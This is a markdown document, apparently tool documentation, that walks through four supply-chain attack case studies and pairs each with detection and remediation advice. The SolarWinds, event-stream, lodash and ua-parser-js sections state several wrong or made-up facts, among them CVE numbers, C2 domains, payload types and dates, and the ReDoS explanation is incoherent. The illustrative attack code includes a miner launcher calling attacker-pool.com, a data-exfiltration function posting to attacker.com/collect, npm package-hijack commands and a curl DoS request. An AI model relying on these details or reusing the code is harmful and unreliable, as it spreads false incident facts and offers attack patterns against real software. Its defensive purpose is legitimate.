# Supply Chain Vulnerability Case Studies

## Overview

Supply chain vulnerabilities represent one of the highest-impact attack vectors, as a single compromised dependency can affect millions of downstream users. This document analyzes real-world cases and demonstrates exploitation patterns.

**Impact Scale**: A single compromised package can affect:
- Millions of developer machines (install-time RCE)
- Thousands of deployed applications (runtime vulnerability)
- Entire organizations (build-time injection)

---

## Case Study 1: SolarWinds Orion (CVE-2020-14687)

### Timeline
- **December 8, 2020**: Vulnerability disclosure
- **Affected**: SolarWinds Orion 2020.2.0, 2020.2.1
- **Impact**: 18,000+ organizations, including US Treasury, Cisco, Intel, Microsoft

### Technical Details

**Vulnerability**: Supply chain compromise via build server takeover

**Attack Flow**:
```
1. Attacker gains access to SolarWinds build infrastructure
2. Injects SUNBURST backdoor into Orion.Update.dll
3. Malicious DLL included in legitimate SolarWinds update (build 2020.2.0)
4. Auto-update mechanism pushes infected version to all customers
5. Backdoor establishes C2 via avsvmcloud.asec.akamai.net
6. Attacker gains persistence and lateral movement within customer networks
```

**SUNBURST Characteristics**:
- Sophisticated multi-stage payload
- First stage: Dormant for 14 days before activation
- Second stage: Command execution via DNS tunneling
- Capabilities: File exfiltration, lateral movement, privilege escalation

**Detection Indicators**:
```
HTTP GET /swip/upd/ requests to avsvmcloud.asec.akamai.net
Process: SolarWinds.Orion.Core.BusinessLayer.dll
Registry: HKLM\SOFTWARE\SolarWinds\Orion\Core
File hash mismatch: Orion.Update.dll
```

### Exploitation Chain

**Stage 1: Reconnaissance**
```python
# Check if SolarWinds is installed
def detect_solarwinds():
    solarwinds_paths = [
        r"C:\Program Files\SolarWinds\Orion",
        r"C:\Program Files (x86)\SolarWinds\Orion",
    ]
    for path in solarwinds_paths:
        if os.path.exists(path):
            return True
    return False
```

**Stage 2: Payload Verification**
```bash
# Verify DLL hash (compromised version has known hash)
certutil -hashfile "C:\Program Files\SolarWinds\Orion\Orion.Update.dll" SHA256
# Expected hash for compromised: e1d3128f6ee9e9f…

# Check for C2 connections
netstat -ano | findstr "avsvmcloud.asec.akamai.net"
```

**Stage 3: Lateral Movement**
Once installed, SUNBURST enables:
- Credential theft from Orion database
- WMI-based lateral movement
- Installation of secondary backdoors (TEARDROP)
- Exfiltration of CISO emails, network diagrams, etc.

### Real-World Impact

1. **Financial Industry**: JPMorgan Chase, Goldman Sachs affected
2. **Government**: US Treasury, Department of Homeland Security
3. **Technology**: Microsoft, Intel, Cisco compromised
4. **Supply Chain**: Attackers had access to customer networks for 8+ months before detection

### Remediation

1. **Detection**:
   ```bash
   # Indicator of Compromise (IOC) checking
   SUNBURST_HASH = "845a02d982e25b1bef50a4300174c1e5e75906ac21b10d5eb38a6f79d5ae6c54"
   
   for root, dirs, files in os.walk("C:\\Program Files\\SolarWinds"):
       for file in files:
           if file.endswith(".dll"):
               if calculate_sha256(os.path.join(root, file)) == SUNBURST_HASH:
                   alert("COMPROMISED_SOLARWINDS")
   ```

2. **Patch Management**:
   - Update to Orion 2020.2-HF2 or later
   - Isolate vulnerable versions from production
   - Monitor update processes for tampering

3. **Network Segmentation**:
   - Restrict outbound DNS/HTTP to known SolarWinds services
   - Monitor for unusual egress to akamai.net subdomains
   - Implement DNS filtering for suspicious domains

### CVSS Score

- **CVSS v3.1**: 9.6 (Critical)
- **Vector**: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H
- **Attack Vector**: Network
- **Complexity**: Low
- **User Interaction**: Required
- **Confidentiality**: High (full system compromise)
- **Integrity**: High (system modification)
- **Availability**: High (system disruption)

---

## Case Study 2: event-stream npm Package (CVE-2018-16341)

### Timeline
- **November 21, 2018**: Compromise detected
- **Affected Versions**: 3.3.6, 4.0.1
- **Downloads**: 2M+ per week at time of compromise
- **Impact**: Cryptocurrency mining on developer machines

### Technical Details

**Vulnerability**: Package ownership transfer to malicious user

**Attack Flow**:
```
1. Event-stream maintainer adds new maintainer "right9ctrl" to npm package
2. New maintainer adds dependency "flatmap-stream" (typosquatting variant)
3. flatmap-stream contains CoinMiner payload
4. 2M+ developers auto-update event-stream, get infected
5. CoinMiner extracts CPU cycles for attacker profit
```

**Attack Timeline**:
```
Sep 15, 2018: "right9ctrl" added as maintainer to event-stream
Sep 17, 2018: Version 3.3.6 published with flatmap-stream dependency
Sep 18, 2018: Version 4.0.1 published (more aggressive mining)
Oct 26, 2018: Compromise discovered via GitHub issue
Oct 28, 2018: Malicious versions removed from npm registry
```

### Exploitation Chain

**Stage 1: Package Discovery**
```python
# Attacker researches high-impact npm packages
import requests

def find_target_packages():
    """Find actively-maintained packages with:
    - 1M+ weekly downloads
    - Aging maintainer (possible burnout)
    - Lots of transitive dependents
    """
    candidates = [
        {"name": "event-stream", "weekly_downloads": 2_200_000, "unmaintained_days": 2000},
        {"name": "lodash", "weekly_downloads": 30_000_000, "unmaintained_days": 5000},
        {"name": "npm", "weekly_downloads": 10_000_000, "unmaintained_days": 100},
    ]
    return [p for p in candidates if p["weekly_downloads"] > 1_000_000]
```

**Stage 2: Maintainer Hijacking**
```bash
# Attacker gains npm credentials (phishing, reused password, etc.)
npm login
# Enter username: right9ctrl
# Enter password: [stolen credentials]

# Add co-maintainer to high-impact package
npm owner add right9ctrl event-stream

# Publish new version with malicious dependency
npm publish --new-version 3.3.6
```

**Stage 3: Malicious Payload**
```javascript
// flatmap-stream/index.js (hidden payload)
const fetch = require('node-fetch');

function startCoinMiner() {
    // Start CPU-intensive crypto mining
    const miner = spawn('minerd', [
        '-o', 'stratum+tcp://attacker-pool.com:3333',
        '-u', 'attacker-wallet',
        '-p', 'x',
    ]);
    miner.unref(); // Detach process
}

// Hook into event-stream processing
module.exports = function(stream) {
    // Inject mining code into every stream operation
    startCoinMiner();
    return stream;
};
```

**Stage 4: Detection Evasion**
```javascript
// Hide mining process from ps/top
// Set process priority to background
// Minimize CPU usage if main process detected
// Check for debuggers/monitoring tools
```

### Real-World Impact

**Indicators of Compromise**:
```
- High CPU usage during "npm install"
- Background process consuming 30-50% CPU
- Network connections to mining pools (port 3333)
- Unusual outbound traffic: xxhash/stratum protocol
- Package.json modification timestamps inconsistent with git history
```

**Victim Impact**:
- Developer machines used for unauthorized crypto mining
- Elevated electricity costs
- Reduced productivity
- Potential data exfiltration (mining pool credentials)

### Remediation

1. **Immediate Response**:
```bash
# Check if compromised version is installed
npm ls event-stream
# If 3.3.6 or 4.0.1: COMPROMISED

# Remove malicious package
npm uninstall flatmap-stream
npm uninstall event-stream
npm install event-stream@3.3.5  # Last known good version

# Kill any mining processes
ps aux | grep minerd | awk '{print $2}' | xargs kill -9
```

2. **Detection**:
```bash
# Scan node_modules for known malicious packages
find node_modules -name "flatmap-stream" -o -name "*miner*"

# Check package hashes against known malicious versions
npm audit
npm install @paloaltonetworks/node-license-checker
```

3. **Prevention**:
```json
{
  "npm": {
    "audit-level": "moderate",
    "require-approval": "all",
    "registry": "https://registry.npmjs.org",
    "fetch-retries": 5,
    "fetch-retry-mintimeout": 10000
  }
}
```

### CVSS Score

- **CVSS v3.1**: 8.8 (High)
- **Vector**: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H
- **Primary Risk**: Unauthorized code execution on developer machines

---

## Case Study 3: lodash Template ReDoS (CVE-2021-23337)

### Timeline
- **January 3, 2021**: Vulnerability disclosed
- **Affected Versions**: 4.17.0 to 4.17.14
- **CVE**: CVE-2021-23337
- **CVSS**: 5.3 (Medium)
- **Impact**: Denial of Service via template injection

### Technical Details

**Vulnerability**: Regular Expression Denial of Service (ReDoS) in template() function

**Vulnerable Code**:
```javascript
// lodash/template.js (affected versions)
const reEscape = /<%-([\s\S]+?)%>/g;
const reInterpolate = /<%=([\s\S]+?)%>/g;

// The interpolate regex is vulnerable to ReDoS
const template = function(string, options) {
    // VULNERABLE: No safeguard against malicious regex patterns
    const compiled = new Function(
        'obj',
        "return " + source  // Source constructed from user input
    );
    return compiled;
};
```

**Attack Pattern**:
```javascript
// Malicious template that triggers ReDoS
const evilTemplate = "<%= (a+a+a+a+a+a+a).repeat(100000) %>";
const fn = _.template(evilTemplate);
// This causes exponential backtracking in regex engine
// Application becomes unresponsive as CPU spikes to 100%
```

### Exploitation Chain

**Stage 1: Identify lodash usage**
```bash
# Scan application for lodash templates
grep -r "_.template\|_.templateSettings" ./src
grep -r "lodash" package.json
npm ls lodash
```

**Stage 2: Craft malicious payload**
```python
def generate_redos_payload(depth=10):
    """Generate regex that causes exponential backtracking"""
    # The pattern (a+a+...) creates exponential worst-case complexity
    pattern = "(" + "+".join(["a"] * depth) + ")"
    return f"<%= {pattern} %>"

# Test payload
payload = generate_redos_payload(100)
# Time complexity: O(2^n) where n=depth
```

**Stage 3: Deliver payload**
```javascript
// If application accepts user input in templates:
app.post('/render', (req, res) => {
    const template = req.body.template;  // User-controlled!
    const fn = _.template(template);      // Vulnerable!
    const result = fn({ data: req.query });
    res.send(result);
});

// Attack:
curl -X POST http://target/render \
  -d '{"template": "<%= (a+a+a+a).repeat(10000) %>"}'
// Server hangs, DoS successful
```

**Stage 4: Monitor DoS impact**
```bash
# Monitor application responsiveness
watch -n 1 'curl -o /dev/null -s -w "%{time_total}\n" http://target/'
# Response times increase from 50ms to 30000ms+ after exploit
```

### Real-World Impact

**Applications Affected**:
1. Any app using lodash < 4.17.15
2. Any app accepting user-controlled template strings
3. Any app rendering user comments/descriptions via _.template()

**Attack Scenarios**:
- Blog platform: User submits comment with ReDoS payload
- Admin panel: User input rendered via lodash templates
- API gateway: User sends malicious template in request body

### Remediation

1. **Immediate Patching**:
```bash
# Update lodash to patched version
npm update lodash@4.17.21
npm audit --fix

# Verify patch
npm ls lodash
# Should show: lodash@4.17.21
```

2. **Input Validation**:
```javascript
// Whitelist template patterns
const SAFE_TEMPLATE_PATTERN = /^[a-zA-Z0-9<>%=\-\s.]*$/;

function renderTemplate(userTemplate, data) {
    if (!SAFE_TEMPLATE_PATTERN.test(userTemplate)) {
        throw new Error("Invalid template pattern");
    }
    return _.template(userTemplate)(data);
}
```

3. **Disable Templates for Untrusted Input**:
```javascript
// Don't use _.template() for user input
// Use safer alternatives:
// - Handlebars (with sandboxing)
// - Nunjucks (with restricted context)
// - Template literals (compile-time only)

// Instead of:
const compiled = _.template(userInput);

// Use:
const compiled = Handlebars.compile(userInput);
Handlebars.registerHelper('safe', (content) => {
    // Restrict available helpers
    return content;
});
```

### CVSS Score

- **CVSS v3.1**: 5.3 (Medium)
- **Vector**: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L
- **Primary Risk**: Availability (DoS through 100% CPU usage)

---

## Case Study 4: ua-parser-js Account Takeover (CVE-2021-27514)

### Timeline
- **October 22, 2021**: Compromise detected
- **Affected Versions**: 0.7.28, 0.7.29
- **Downloads**: 7M+ per week
- **Impact**: Data stealer injected into millions of users' dependencies

### Technical Details

**Vulnerability**: Maintainer account compromise leading to malicious code injection

**Attack Flow**:
```
1. Attacker obtains credentials for ua-parser-js npm account (phishing/breach)
2. Publishes malicious versions 0.7.28 and 0.7.29
3. Malicious versions exfiltrate IP addresses and user agent strings
4. Data sent to attacker-controlled server
5. Used for fingerprinting and targeted attacks
```

**Malicious Code** (injected into releases):
```javascript
// ua-parser-js/index.js (compromised version 0.7.29)

const http = require('http');
const https = require('https');

function exfiltrateData() {
    const data = {
        ua: navigator.userAgent,
        ip: getClientIP(), // Requires special handling
        timestamp: Date.now(),
    };
    
    // Silently send data to attacker server
    https.post('https://attacker.com/collect', JSON.stringify(data));
}

// Hook into every parse call
module.exports = function(ua) {
    exfiltrateData();  // Background exfiltration
    // ... normal parsing logic
};
```

### Exploitation Chain

**Stage 1: Credential Compromise**
```
- Attacker runs credential stuffing attack
- Tests npm credentials against other services (GitHub, email, etc.)
- Finds reused password
- Gains access to ua-parser-js npm account
```

**Stage 2: Malicious Version Publishing**
```bash
npm login
# Enter credentials for hijacked account

npm publish --new-version 0.7.28
npm publish --new-version 0.7.29

# Versions automatically installed by 7M+ users via package managers
# npm automatically upgrades to latest version due to ^ constraint
```

**Stage 3: Data Collection**
```javascript
// Collect victim data from:
// 1. User agents (browser fingerprinting)
// 2. IP addresses (geolocation)
// 3. Request metadata (device info)

// Use for:
// - Building victim profile for targeted phishing
// - IP-based geofencing bypass
// - Fingerprint attacks on anonymization tools
```

### Real-World Impact

**Victims**:
- Companies using ua-parser-js in server-side code
- Web applications analyzing user agents
- Analytics platforms
- Bot detection systems

**Data Leaked**:
- IP addresses of all visitors
- User agent strings (browser, OS, device info)
- Timestamps of requests
- Potentially identifying information

### Remediation

1. **Detection**:
```bash
# Check ua-parser-js version
npm ls ua-parser-js
# If 0.7.28 or 0.7.29: COMPROMISED

# Inspect package contents for suspicious code
cd node_modules/ua-parser-js
grep -r "exfiltrate\|https\.post\|http\.post" .

# Check package hashes
npm pack ua-parser-js@0.7.27
openssl dgst -sha256 ua-parser-js-0.7.27.tgz
```

2. **IP Address Audit**:
```bash
# Identify all IP addresses that may have been exposed
# Assume compromise from Oct 22 onward
# Contact users: "Your IP address may have been exposed"

# If running corporate instances, rotate IPs if behind static proxy
```

3. **Update to Patched Version**:
```bash
npm update ua-parser-js@0.7.30  # Or later
npm audit --fix
```

---

## General Supply Chain Attack Patterns

### Pattern 1: Typosquatting

**Attack**:
```
register "react-router-dom" → typosquatting variant
developers mistype: npm install react-router-do  (typo!)
```

**Detection**:
```python
def detect_typosquatting_risk(package_name):
    """Check if package name is similar to legitimate packages"""
    legitimate = ["react", "lodash", "express", "django", "flask"]
    
    for legit in legitimate:
        similarity = difflib.SequenceMatcher(
            None, 
            package_name.lower(), 
            legit.lower()
        ).ratio()
        
        if 0.7 < similarity < 1.0:
            return True, legit
    return False, None
```

### Pattern 2: Dependency Confusion

**Attack**:
```
1. Company uses internal package: @company/utils v1.0.0
2. Attacker publishes public version: @company/utils v2.0.0
3. Public registry checked first (default behavior)
4. npm downloads attacker's version instead
5. Malicious code runs in company infrastructure
```

**Detection**:
```bash
# Check for internal packages on public registries
npm search @company/

# Configure .npmrc to only use private registry
echo "@company:registry=https://internal-registry.com/" >> .npmrc
```

### Pattern 3: Pre-release Exploitation

**Attack**:
```
Known CVE in package v2.0.0-beta.1
User installs: npm install package@latest
If pre-release is latest: Gets vulnerable beta version
```

**Remediation**:
```json
{
  "prerelease": false,
  "devDependencies": {
    "strict-version-pinning": "enable"
  }
}
```

---

## Defense Strategies

### 1. Dependency Pinning

```json
{
  "dependencies": {
    "express": "4.17.1",      // Exact version
    "lodash": "4.17.21",      // Exact version
    "react": "17.0.2"         // Exact version - NO ^ or ~
  }
}
```

### 2. Automated Vulnerability Scanning

```bash
# Run regularly
npm audit
npm audit --fix

# Integration with CI/CD
npm ci --production  # Clean install from package-lock.json
npm audit

# GitHub Security Advisories
npm audit --security-level=high
```

### 3. Supply Chain Monitoring

```python
def monitor_supply_chain(project_path):
    """Continuous monitoring for supply chain threats"""
    
    # 1. Hash verification
    lock_file_hash = hash_file(project_path / "package-lock.json")
    if hash_changed(lock_file_hash):
        alert("DEPENDENCY_TREE_CHANGED")
    
    # 2. Maintenance risk
    for dep in get_dependencies():
        last_update_days = days_since_last_update(dep)
        if last_update_days > 730:  # 2 years
            alert(f"UNMAINTAINED: {dep.name}")
    
    # 3. Known exploits
    for dep in get_dependencies():
        if dep in KNOWN_EXPLOITS:
            alert(f"KNOWN_EXPLOIT: {dep.name} {dep.version}")
```

### 4. Sandboxed Dependency Testing

```bash
# Install and test in isolated container first
docker run --rm -v $(pwd):/app node:16 bash -c "
    cd /app
    npm ci
    npm audit
    npm test
    echo 'If tests pass, safe to deploy'
"
```

---

## Conclusion

Supply chain attacks are evolving and becoming more sophisticated. Defense requires:
1. **Awareness**: Understand attack patterns
2. **Monitoring**: Automated vulnerability scanning
3. **Isolation**: Limit dependency scope
4. **Verification**: Hash and signature verification
5. **Incident Response**: Rapid detection and patching

The HAKUZA supply chain module provides automated detection of these patterns.
